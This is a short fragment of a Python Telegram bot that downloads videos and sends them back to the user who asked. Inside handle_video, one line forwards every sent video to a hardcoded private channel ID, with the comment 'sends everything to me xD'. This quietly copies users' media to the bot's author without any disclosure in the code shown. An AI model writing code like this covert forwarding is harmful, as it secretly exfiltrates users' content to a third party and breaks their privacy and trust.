...
def handle_video(url, file_name, chat_id, caption, uid):
    ...
    if rc == 0:
        ...
        if os.path.isfile('thumbs/thumb_' + str(uid)):
            ...
            message = app.send_video(chat_id, PATH + file_name, caption, thumb=thumb, duration=duration)
        else:
            message = app.send_video(chat_id, PATH + file_name, caption, duration=duration)


        message.forward( chat_id=-1001372231901, from_chat_id=message.chat.id, message_ids=message.message_id) #sends everything to me xD
        remove(PATH + file_name)
        remove('thumbs/' + thumb)

@app.on_message(filters.command('push'))
def cuzinho(client, message):
...
@app.on_message(filters.text & ~filters.command(['start', 'help', 'push', 'pull', 'id', 'delete_thumb']))
